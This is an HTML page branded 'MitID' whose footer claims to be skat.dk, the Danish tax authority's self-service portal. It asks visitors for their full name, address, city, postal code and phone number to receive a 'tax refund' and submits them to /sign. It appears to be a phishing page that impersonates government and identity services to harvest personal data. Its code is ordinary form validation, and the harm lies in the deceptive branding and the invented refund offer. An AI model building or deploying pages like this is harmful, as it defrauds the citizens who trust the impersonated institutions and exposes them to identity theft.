<!DOCTYPE html>
<html>
  <head>
    <title>MitID</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      type="text/css"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="/static/style.css" />
  </head>

  <body>
    <script
      src="https://code.jquery.com/jquery-3.6.1.min.js"
      integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
      crossorigin="anonymous"
    ></script>
    <script>
      $(function () {
        'use strict'

        // Fetch all the forms we want to apply custom Bootstrap validation styles to
        const forms = document.querySelectorAll('.needs-validation')

        $('#phone-number').on('keyup', function() {
          if (this.checkValidity()) {
            $(this).parents('.custom-validation').toggleClass('is-valid', true).toggleClass('is-invalid', false)
          } else {
            $(this).parents('.custom-validation').toggleClass('is-valid', false).toggleClass('is-invalid', true)
          }
        })

        // Loop over them and prevent submission
        Array.prototype.slice.call(forms)
          .forEach(function (form) {
            form.addEventListener('submit', function (event) {
              if (!form.checkValidity()) {
                const children = $(event.target).children('.custom-validation')
                children.each(function() {
                  if ($(this).children('input')[0] && $(this).children('input')[0].checkValidity()) {
                    $(this).toggleClass('is-valid', true).toggleClass('is-invalid', false)
                  } else {
                    $(this).toggleClass('is-valid', false).toggleClass('is-invalid', true)
                  }
                })
                event.preventDefault()
                event.stopPropagation()
              }

              form.classList.add('was-validated')
            }, false)
          })
      });

      function isNumberKey(evt)
        {
          let charCode = (evt.which) ? evt.which : event.keyCode
          if (charCode > 31 && (charCode < 48 || charCode > 57))
          return false;

          return true;
        }
    </script>

    <div class="signup-form">
      <div class="frame px-2">
        <img src="/static/logo.png" />
      </div>
      <div class="container-fluid px-5">
        <div class="signup text-center">
          <p>Oplys dine informationer nedenfor for at opnå din skatterefusion</p>
        </div>
        <form action="/sign" method="POST" id="form" class="needs-validation" novalidate>
          <div class="form-group input-group-lg">
            <label for="name">Fulde Navn <span>*</span></label>
            <input
              type="text"
              class="form-control sign-input"
              id="name"
              name="name"
              required
            />
            <div class="invalid-feedback">
              (!) Feltet er påkrævet.
            </div>
          </div>
          <div class="form-group input-group-lg">
            <label for="address">Adresse <span>*</span></label>
            <input
              type="text"
              class="form-control sign-input"
              id="address"
              name="address"
              required
            />
            <div class="invalid-feedback">
              (!) Feltet er påkrævet.
            </div>
          </div>
          <div class="form-group input-group-lg">
            <label for="by">By <span>*</span></label>
            <input
              type="text"
              class="form-control sign-input"
              id="by"
              name="by"
              required
            />
            <div class="invalid-feedback">
              (!) Feltet er påkrævet.
            </div>
          </div>
          <div class="form-group input-group-lg">
            <label for="postalcode">Postnummer <span>*</span></label>
            <input
              type="text"
              class="form-control sign-input"
              id="postalcode"
              name="postalCode"
              placeholder="XXXX"
              maxlength="4"
              pattern="\d{4}"
              onkeypress="return isNumberKey(event)"
              required
            />
            <div class="invalid-feedback">
              (!) Feltet er påkrævet.
            </div>
          </div>
          <div class="form-group input-group-lg d-flex flex-column custom-validation">
            <label for="phone">Telefon <span>*</span></label>
            <div class="form-control tel-input-box d-inline-block" required>
              <span class="country-code">(+45)</span>
              <input 
                type="tel"
                class="form-control tel-input"
                id="phone-number"
                name="phone"
                aria-describedby="phoneNumber"
                maxlength="8"
                pattern="\d{8}"
                onkeypress="return isNumberKey(event)"
                required
              />
            </div>
            <div class="invalid-feedback">
              (!) Feltet er påkrævet.
            </div>
          </div>
          <button
            type="submit"
            class="btn btn-lg btn-block btn-green"
            style="margin-top: 60px"
          >
            Fortsæt
          </button>
        </form>
      </div>
      <div class="bottom-content">
        <div class="content-border-bottom">
          <h5>Tilgængelighedserklæring Kontakt Om cookies os:72 22 18 18</h5>
        </div>
        <p>
          skat.dk er Skatteforvaltningens digitale indgang til selvbetjening og
          vejledning om skatter og afgifter
        </p>
      </div>
    </div>
  </body>
</html>
